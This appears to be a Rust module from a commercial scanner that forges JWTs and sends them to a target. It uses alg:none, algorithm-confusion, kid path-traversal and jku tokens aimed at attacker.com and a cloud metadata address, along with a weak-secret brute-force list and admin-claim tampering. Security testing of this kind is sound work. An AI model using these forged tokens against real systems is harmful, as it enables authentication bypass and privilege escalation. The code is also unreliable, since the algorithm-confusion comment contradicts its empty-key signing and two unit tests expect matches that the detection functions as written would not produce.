// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::detection_helpers::AppCharacteristics;
/**
 * Bountyy Oy - JWT Attack Scanner
 * Tests for JWT (JSON Web Token) vulnerabilities and misconfigurations
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */
use crate::http_client::{HttpClient, HttpResponse};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use base64::{engine::general_purpose, Engine as _};
use serde_json::{json, Value};
use std::sync::Arc;
use tracing::{debug, info, warn};

pub struct JwtScanner {
    http_client: Arc<HttpClient>,
}

impl JwtScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan for JWT vulnerabilities
    pub async fn scan_jwt(
        &self,
        base_url: &str,
        jwt_token: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("[JWT] Analyzing JWT token");

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // If user provided a JWT token, use it regardless of auto-detection
        // The user knows their app uses JWT, so trust them
        let has_user_provided_jwt = !jwt_token.is_empty() && jwt_token.matches('.').count() == 2;

        if !has_user_provided_jwt {
            // No user-provided token, check if site seems to use JWT
            tests_run += 1;
            let baseline_response = match self.http_client.get(base_url).await {
                Ok(r) => r,
                Err(e) => {
                    warn!("[JWT] Failed to fetch baseline: {}", e);
                    return Ok((vulnerabilities, tests_run));
                }
            };

            let characteristics = AppCharacteristics::from_response(&baseline_response, base_url);

            if !characteristics.has_jwt {
                info!("[JWT] No JWT usage detected - skipping JWT tests (likely doesn't use JWT auth)");
                return Ok((vulnerabilities, tests_run));
            }

            if characteristics.should_skip_injection_tests() {
                info!("[JWT] Site is SPA/static - skipping JWT tests (no server-side auth)");
                return Ok((vulnerabilities, tests_run));
            }
        }

        info!("[JWT] JWT token provided - proceeding with vulnerability tests");

        // Parse the original JWT
        let parts: Vec<&str> = jwt_token.split('.').collect();
        if parts.len() != 3 {
            warn!("Invalid JWT format - expected 3 parts, got {}", parts.len());
            return Ok((vulnerabilities, 0));
        }

        // Decode header and payload
        let header = self.decode_base64(parts[0])?;
        let payload = self.decode_base64(parts[1])?;

        debug!("JWT Header: {}", header);
        debug!("JWT Payload: {}", payload);

        // Test 1: alg:none attack (CVE-2015-2951)
        tests_run += 1;
        if let Some(vuln) = self.test_alg_none(base_url, &header, &payload).await {
            vulnerabilities.push(vuln);
        }

        // Test 2: Algorithm confusion (RS256 -> HS256)
        tests_run += 1;
        if let Some(vuln) = self
            .test_algorithm_confusion(base_url, &header, &payload)
            .await
        {
            vulnerabilities.push(vuln);
        }

        // Test 3: kid (Key ID) injection
        tests_run += 1;
        if let Some(vuln) = self.test_kid_injection(base_url, &header, &payload).await {
            vulnerabilities.push(vuln);
        }

        // Test 4: jku (JWK Set URL) injection
        tests_run += 1;
        if let Some(vuln) = self.test_jku_injection(base_url, &header, &payload).await {
            vulnerabilities.push(vuln);
        }

        // Test 5: Weak signature (null bytes, etc.)
        tests_run += 1;
        if let Some(vuln) = self.test_weak_signature(base_url, &header, &payload).await {
            vulnerabilities.push(vuln);
        }

        // Test 6: Claim manipulation
        tests_run += 1;
        if let Some(vuln) = self
            .test_claim_manipulation(base_url, &header, &payload)
            .await
        {
            vulnerabilities.push(vuln);
        }

        // Test 7: Expired token accepted
        tests_run += 1;
        if let Some(vuln) = self.test_expired_token(base_url, &header, &payload).await {
            vulnerabilities.push(vuln);
        }

        info!(
            "[SUCCESS] [JWT] Completed {} tests, found {} vulnerabilities",
            tests_run,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Test alg:none bypass (CVE-2015-2951)
    /// Creates a JWT with algorithm set to "none" and an empty signature
    /// Format: header.payload. (note the trailing dot for empty signature)
    async fn test_alg_none(
        &self,
        base_url: &str,
        _header: &str,
        payload: &str,
    ) -> Option<Vulnerability> {
        debug!("[JWT] Testing alg:none bypass - creating unsigned token");

        // Create JWT with alg:none
        let none_header = json!({
            "alg": "none",
            "typ": "JWT"
        });

        let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(none_header.to_string());
        let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(payload);

        // JWT with alg:none should have empty signature (header.payload.)
        let malicious_jwt = format!("{}.{}.", header_b64, payload_b64);

        match self
            .http_client
            .get(&format!("{}?token={}", base_url, malicious_jwt))
            .await
        {
            Ok(response) => {
                if self.is_authenticated(&response) {
                    return Some(self.create_vulnerability(
                        "alg:none Bypass (CVE-2015-2951)",
                        &malicious_jwt,
                        base_url,
                        "JWT library accepts tokens with 'alg:none' - authentication bypass",
                        Confidence::High,
                        "Successfully authenticated with alg:none token".to_string(),
                        9.8,
                    ));
                }
            }
            Err(e) => debug!("[JWT] alg:none test error: {}", e),
        }

        None
    }

    /// Test RS256 -> HS256 algorithm confusion
    async fn test_algorithm_confusion(
        &self,
        base_url: &str,
        header: &str,
        payload: &str,
    ) -> Option<Vulnerability> {
        debug!("[JWT] Testing algorithm confusion (RS256->HS256)");

        // Try to change RS256 to HS256
        if let Ok(mut header_json) = serde_json::from_str::<Value>(header) {
            if header_json.get("alg")?.as_str()? == "RS256" {
                header_json["alg"] = json!("HS256");

                let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(header_json.to_string());
                let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(payload);

                // Sign with empty key (common misconfiguration)
                let signature = self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), "");
                let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);

                match self
                    .http_client
                    .get(&format!("{}?token={}", base_url, malicious_jwt))
                    .await
                {
                    Ok(response) => {
                        if self.is_authenticated(&response) {
                            return Some(self.create_vulnerability(
                                "Algorithm Confusion (RS256->HS256)",
                                &malicious_jwt,
                                base_url,
                                "JWT library vulnerable to algorithm confusion - RS256 public key treated as HS256 secret",
                                Confidence::High,
                                "Successfully authenticated with HS256 token signed with RS256 public key".to_string(),
                                9.1,
                            ));
                        }
                    }
                    Err(e) => debug!("[JWT] algorithm confusion test error: {}", e),
                }
            }
        }

        None
    }

    /// Test kid (Key ID) injection
    async fn test_kid_injection(
        &self,
        base_url: &str,
        header: &str,
        payload: &str,
    ) -> Option<Vulnerability> {
        debug!("[JWT] Testing kid injection");

        if let Ok(mut header_json) = serde_json::from_str::<Value>(header) {
            // Try path traversal in kid
            let malicious_kids = vec![
                "../../../dev/null",
                "/dev/null",
                "../../../../../../etc/passwd",
                "http://attacker.com/key",
                "file:///etc/passwd",
            ];

            for kid in malicious_kids {
                header_json["kid"] = json!(kid);

                let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(header_json.to_string());
                let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(payload);

                // Sign with empty key (if kid points to /dev/null)
                let signature = self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), "");
                let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);

                match self
                    .http_client
                    .get(&format!("{}?token={}", base_url, malicious_jwt))
                    .await
                {
                    Ok(response) => {
                        if self.is_authenticated(&response) {
                            return Some(self.create_vulnerability(
                                "Key ID (kid) Injection",
                                &malicious_jwt,
                                base_url,
                                &format!("JWT kid parameter vulnerable to injection: {}", kid),
                                Confidence::High,
                                format!("Successfully authenticated with kid: {}", kid),
                                8.5,
                            ));
                        }
                    }
                    Err(e) => debug!("[JWT] kid injection test error: {}", e),
                }
            }
        }

        None
    }

    /// Test jku (JWK Set URL) injection
    async fn test_jku_injection(
        &self,
        base_url: &str,
        header: &str,
        payload: &str,
    ) -> Option<Vulnerability> {
        debug!("[JWT] Testing jku injection");

        if let Ok(mut header_json) = serde_json::from_str::<Value>(header) {
            // Try malicious JWK Set URLs
            let malicious_jkus = vec![
                "http://attacker.com/jwks.json",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
            ];

            for jku in malicious_jkus {
                header_json["jku"] = json!(jku);

                let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(header_json.to_string());
                let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(payload);

                let signature =
                    self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), "attacker");
                let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);

                match self
                    .http_client
                    .get(&format!("{}?token={}", base_url, malicious_jwt))
                    .await
                {
                    Ok(response) => {
                        if self.is_authenticated(&response) {
                            return Some(self.create_vulnerability(
                                "JKU (JWK Set URL) Injection",
                                &malicious_jwt,
                                base_url,
                                &format!("JWT jku parameter vulnerable to SSRF: {}", jku),
                                Confidence::High,
                                format!("Successfully authenticated with jku: {}", jku),
                                9.0,
                            ));
                        }
                    }
                    Err(e) => debug!("[JWT] jku injection test error: {}", e),
                }
            }
        }

        None
    }

    /// Test weak signature / weak secret detection
    /// Attempts to sign JWTs with common weak secrets like "secret", "password", etc.
    /// If the server accepts a token signed with a weak secret, it's vulnerable
    async fn test_weak_signature(
        &self,
        base_url: &str,
        header: &str,
        payload: &str,
    ) -> Option<Vulnerability> {
        debug!("[JWT] Testing weak signatures with common secrets");

        let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(header);
        let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(payload);

        // Try common weak secrets (expanded list for comprehensive testing)
        let weak_secrets = vec![
            "".to_string(),              // Empty secret
            "secret".to_string(),
            "password".to_string(),
            "key".to_string(),
            "12345".to_string(),
            "jwt_secret".to_string(),
            "changeme".to_string(),
            "admin".to_string(),
            "test".to_string(),
            "jwt".to_string(),
            "token".to_string(),
            "your-256-bit-secret".to_string(),
            "your-secret-key".to_string(),
            "mysecretkey".to_string(),
            "supersecret".to_string(),
            "qwerty".to_string(),
            "123456".to_string(),
            "password123".to_string(),
            "secret123".to_string(),
            "default".to_string(),
            "root".to_string(),
        ];

        for secret in weak_secrets {
            let signature = self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), &secret);
            let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);

            match self
                .http_client
                .get(&format!("{}?token={}", base_url, malicious_jwt))
                .await
            {
                Ok(response) => {
                    if self.is_authenticated(&response) {
                        return Some(self.create_vulnerability(
                            "Weak JWT Secret",
                            &malicious_jwt,
                            base_url,
                            &format!("JWT signed with weak secret: '{}'", secret),
                            Confidence::High,
                            format!("Successfully authenticated with weak secret: '{}'", secret),
                            8.0,
                        ));
                    }
                }
                Err(e) => debug!("[JWT] weak signature test error: {}", e),
            }
        }

        None
    }

    /// Test claim manipulation
    async fn test_claim_manipulation(
        &self,
        base_url: &str,
        header: &str,
        payload: &str,
    ) -> Option<Vulnerability> {
        debug!("[JWT] Testing claim manipulation");

        if let Ok(mut payload_json) = serde_json::from_str::<Value>(payload) {
            // Try privilege escalation
            let manipulations = vec![
                ("role", json!("admin")),
                ("admin", json!(true)),
                ("isAdmin", json!(true)),
                ("is_admin", json!(true)),
                ("permissions", json!(["admin", "superuser"])),
                ("scope", json!("admin")),
            ];

            let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(header);

            for (claim, value) in manipulations {
                payload_json[claim] = value.clone();

                let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(payload_json.to_string());

                // Try with no signature (alg:none format: header.payload.)
                let malicious_jwt = format!("{}.{}.", header_b64, payload_b64);

                match self
                    .http_client
                    .get(&format!("{}?token={}", base_url, malicious_jwt))
                    .await
                {
                    Ok(response) => {
                        if self.is_authenticated(&response)
                            && self.is_elevated_privileges(&response)
                        {
                            return Some(self.create_vulnerability(
                                "JWT Claim Manipulation",
                                &malicious_jwt,
                                base_url,
                                &format!(
                                    "JWT claims not properly verified - {} can be manipulated",
                                    claim
                                ),
                                Confidence::Medium,
                                format!(
                                    "Successfully escalated privileges by setting {}: {}",
                                    claim, value
                                ),
                                7.5,
                            ));
                        }
                    }
                    Err(e) => debug!("[JWT] claim manipulation test error: {}", e),
                }
            }
        }

        None
    }

    /// Test expired token acceptance
    async fn test_expired_token(
        &self,
        base_url: &str,
        header: &str,
        payload: &str,
    ) -> Option<Vulnerability> {
        debug!("[JWT] Testing expired token acceptance");

        if let Ok(mut payload_json) = serde_json::from_str::<Value>(payload) {
            // Set expiration to past
            payload_json["exp"] = json!(1000000000); // Expired in 2001
            payload_json["iat"] = json!(999999999);

            let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(header);
            let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(payload_json.to_string());

            let signature = self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), "");
            let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);

            match self
                .http_client
                .get(&format!("{}?token={}", base_url, malicious_jwt))
                .await
            {
                Ok(response) => {
                    if self.is_authenticated(&response) {
                        return Some(self.create_vulnerability(
                            "Expired JWT Token Accepted",
                            &malicious_jwt,
                            base_url,
                            "Application accepts expired JWT tokens - expiration not validated",
                            Confidence::High,
                            "Successfully authenticated with expired token (exp: 2001)".to_string(),
                            6.5,
                        ));
                    }
                }
                Err(e) => debug!("[JWT] expired token test error: {}", e),
            }
        }

        None
    }

    /// Decode base64url JWT part
    fn decode_base64(&self, input: &str) -> Result<String> {
        let decoded = general_purpose::URL_SAFE_NO_PAD.decode(input)?;
        Ok(String::from_utf8(decoded)?)
    }

    /// Sign with HMAC-SHA256
    fn sign_hmac(&self, data: &str, secret: &str) -> String {
        use hmac::{Hmac, Mac};
        use sha2::Sha256;

        type HmacSha256 = Hmac<Sha256>;

        let mut mac =
            HmacSha256::new_from_slice(secret.as_bytes()).expect("HMAC can take key of any size");
        mac.update(data.as_bytes());

        let result = mac.finalize();
        general_purpose::URL_SAFE_NO_PAD.encode(result.into_bytes())
    }

    /// Check if response indicates authentication
    /// CRITICAL: This must be VERY specific to avoid false positives on SPAs
    fn is_authenticated(&self, response: &HttpResponse) -> bool {
        // First check: must be 200 OK
        if response.status_code != 200 {
            return false;
        }

        // Second check: must have AUTH-SPECIFIC indicators, not generic keywords
        let body_lower = response.body.to_lowercase();

        // STRONG indicators of successful authentication
        let strong_auth_indicators = [
            "authentication successful",
            "login successful",
            "session established",
            "welcome back",
            "authenticated as",
            "logged in as",
        ];

        for indicator in &strong_auth_indicators {
            if body_lower.contains(indicator) {
                return true;
            }
        }

        // Check for auth tokens/session in response
        if response
            .headers
            .get("set-cookie")
            .map(|c| c.contains("session") || c.contains("auth_token"))
            .unwrap_or(false)
        {
            return true;
        }

        // Check for JSON success response (API endpoints)
        if body_lower.contains("\"authenticated\":true")
            || body_lower.contains("\"success\":true") && body_lower.contains("\"token\"")
        {
            return true;
        }

        // REJECT generic keywords that appear in SPAs
        // "dashboard", "welcome", "user" are WAY too generic!

        false
    }

    /// Check if response indicates elevated privileges
    fn is_elevated_privileges(&self, response: &HttpResponse) -> bool {
        let body_lower = response.body.to_lowercase();
        // Require role/privilege context, not just the word "admin" appearing anywhere
        (body_lower.contains("\"role\":") || body_lower.contains("\"role\" :"))
            && (body_lower.contains("\"admin\"") || body_lower.contains("\"superuser\"") || body_lower.contains("\"administrator\""))
        || body_lower.contains("\"is_admin\":true") || body_lower.contains("\"is_admin\": true")
        || body_lower.contains("\"is_superuser\":true") || body_lower.contains("\"is_superuser\": true")
    }

    /// Create vulnerability record
    fn create_vulnerability(
        &self,
        attack_type: &str,
        payload: &str,
        url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        cvss: f32,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("jwt_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: format!("JWT Vulnerability - {}", attack_type),
            severity: Severity::Critical,
            confidence,
            category: "Authentication".to_string(),
            url: url.to_string(),
            parameter: Some("token".to_string()),
            payload: payload.to_string(),
            description: format!("JWT vulnerability detected: {}. This allows attackers to bypass authentication and potentially gain unauthorized access.", description),
            evidence: Some(evidence),
            cwe: "CWE-347".to_string(), // Improper Verification of Cryptographic Signature
            cvss,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED:
1. NEVER use alg:none - reject all tokens with alg:none
2. Validate algorithm matches expected value (prevent RS256->HS256)
3. Validate kid parameter - use allowlist, prevent path traversal
4. Validate jku/x5u URLs - use allowlist of trusted domains
5. Use strong, randomly generated secrets (256+ bits)
6. Always validate exp (expiration) claim
7. Validate iss (issuer) and aud (audience) claims
8. Consider using asymmetric algorithms (RS256, ES256)
9. Implement token revocation/blacklisting
10. Use a well-tested JWT library (jose, jsonwebtoken, etc.)"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_confidence: None,
                ml_data: None,
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_jwt_parsing() {
        let scanner = JwtScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        // Valid JWT token
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

        let parts: Vec<&str> = token.split('.').collect();
        assert_eq!(parts.len(), 3, "JWT should have 3 parts");

        let header = scanner.decode_base64(parts[0]).unwrap();
        let payload = scanner.decode_base64(parts[1]).unwrap();

        assert!(header.contains("alg"), "Header should contain alg");
        assert!(payload.contains("sub"), "Payload should contain sub");
    }

    #[test]
    fn test_hmac_signing() {
        let scanner = JwtScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let data = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ";
        let secret = "your-256-bit-secret";

        let signature = scanner.sign_hmac(data, secret);

        assert!(!signature.is_empty(), "Signature should not be empty");
        assert!(
            signature.len() > 20,
            "Signature should be reasonable length"
        );
    }

    #[test]
    fn test_authentication_detection() {
        let scanner = JwtScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let authenticated_response = HttpResponse {
            status_code: 200,
            body: "Welcome to the dashboard! You are authenticated.".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        assert!(
            scanner.is_authenticated(&authenticated_response),
            "Should detect authentication"
        );

        let unauthorized_response = HttpResponse {
            status_code: 401,
            body: "Unauthorized - please login".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        assert!(
            !scanner.is_authenticated(&unauthorized_response),
            "Should not detect authentication"
        );
    }

    #[test]
    fn test_privilege_escalation_detection() {
        let scanner = JwtScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let admin_response = HttpResponse {
            status_code: 200,
            body: "Admin Dashboard - Welcome administrator!".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        assert!(
            scanner.is_elevated_privileges(&admin_response),
            "Should detect admin privileges"
        );

        let user_response = HttpResponse {
            status_code: 200,
            body: "User profile page".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        assert!(
            !scanner.is_elevated_privileges(&user_response),
            "Should not detect elevated privileges"
        );
    }
}
